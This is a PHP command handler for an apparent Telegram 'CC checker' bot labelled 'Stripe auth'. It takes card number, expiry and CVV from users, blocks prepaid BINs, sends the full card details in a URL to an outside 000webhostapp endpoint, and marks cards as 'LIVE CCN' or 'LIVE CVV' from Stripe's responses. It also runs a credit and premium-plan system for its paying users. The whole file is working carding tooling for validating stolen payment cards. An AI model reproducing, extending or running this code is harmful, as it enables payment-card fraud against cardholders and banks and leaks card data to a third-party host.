<?php
#require_once 'function.php';

$gate = 'au';
$gateName = 'Stripe auth';

#sendMessage($chat_id, $chat_type, $message_id);
verificarGate($gate, $chat_id, $message_id);

$datosUsuario = userData($user_id, $username, $chat_id, $message_id);
$rango = $datosUsuario['rango'];
$creditos = $datosUsuario['creditos'];
$anti_spam = $datosUsuario['anti_spam'];
$plan = $datosUsuario['plan'];
$warns = $datosUsuario['warns'];
$last_message_time = $datosUsuario['last_message_time'];

if($warns > 2){
  sendMessage($chat_id,"<b>⚠ You have accumulated +2 warns.\nPlease contact the $owner.</b>",$message_id);
  exit();
}

$date1 = date('Y-m-d H:i:s');
$diferencia = strtotime($date1) - strtotime($last_message_time);
$tiempo_restante = $anti_spam - $diferencia;

if ($tiempo_restante > 0) {
    sendMessage($chat_id, "Time remaining: $tiempo_restante seconds.", $message_id);
    exit();
}

if ($plan !== 'premium' && $chat_type === 'private') {
    sendMessage($chat_id, "<b>⚠ Error:</b> This command is only available for premium users.", $message_id);
    exit();
} elseif ($chat_type === 'supergroup') {
    $creditos = groupPlan($chat_id, $message_id);
}

if ($creditos <= 2) {
    sendMessage($chat_id, "<b>⚠ Error: You don't have enough credits.</b>", $message_id);
    exit();
}

$date1 = date('Y-m-d H:i:s');
$diferencia = strtotime($date1) - strtotime($last_message_time);
$tiempo_restante = $anti_spam - $diferencia;

if ($tiempo_restante > 0) {
    sendMessage($chat_id, "Tiempo restante: $tiempo_restante segundos.", $message_id);
    exit();
}

updateTime($user_id);

$lista = clean($message) ?: clean($r_message);
$exploded = multiexplode(array(":", "/", " ", "|", "::"), $lista);
$cc = $exploded[0];
$mes = $exploded[1];
$ano = $exploded[2];
$cvv = $exploded[3];

$mes = ltrim($mes, '0');
$ano = strlen($ano) == 2 ? '20' . $ano : $ano;

validateCreditCard($cc, $cvv, $mes, $ano, $gate, $gateName, $chat_id, $message_id);

/* BIN INFO[informacion del bin] */

$datoscc = "$cc|$mes|$ano|$cvv";
$ccbin = substr($cc, 0, 6);

$tiempo = microtime(true);
$mytime = 'time1';

$binData = getBinData($ccbin);

if($binData['level'] == 'prepaid'){
  sendMessage($chat_id, "<b>⚠ Error: bin prepaid locked.\nContact the owner $owner if you think it's a mistake.</b>", $message_id);
  exit();
}


$lod = "<em>
    🔄 Please Wait ...
    Card : <code>$datoscc</code>
    Country : {$binData['pais']} {$binData['flag']}
    Bank : {$binData['banco']}
    ━━━━━━━━━━━━━━
    Time : {$mytime($tiempo)}s
    By : @DEVPHPJS
    </em>";

$m1 = sendMessage($chat_id, $lod, $message_id);
$m1 = $m1['result']['message_id'];

#exit();

$link = "https://rudeosgret1.000webhostapp.com/apis/stripe.php?data=$datoscc";

$r7 = file_get_contents($link);

$msg = getstr($r7, '"message":"', '"');

if (strpos($r7, "Your card's security code is incorrect.")) {
    $status = "LIVE CCN ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r7, 'Your card has insufficient funds.')) {
    $status = "LIVE CVV ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r7, '"cvc_check":"pass"')) {
    $status = "LIVE CVV ⚡";
    $response = "card added successfully ✅";
    restarCreditos($chat_id);
} else {
    $status = "REPROVADA 🔴";
    $response = $msg;
}

$cmdr = "
<a href='https://t.me/rudeos_greyrat_chk'> 𝙍𝙪𝙙𝙚𝙤𝙨_𝙘𝙝𝙠𝘽𝙤𝙩</a>
<em>                
[⁜] <b>card</b> ➳ <code>$datoscc</code>
[⁜] <b>status</b> ➳ $status
[⁜] <b>response</b> ➳ $response

[⁜] <b>search bin.</b> ➳ {$binData['pais']} {$binData['flag']}
{$binData['banco']} - {$binData['level']} - {$binData['tipo']}

[⁜] <b>Time</b> ➳ {$mytime($tiempo)}s
[⁜] <b>gate</b> ➳ $gateName
[⁜] <b>User</b> ➳ @$username [<b>$rango</b>]
[⁜] <b>$owner</b>
</em>";

editMessage($chat_id, $cmdr, $m1);
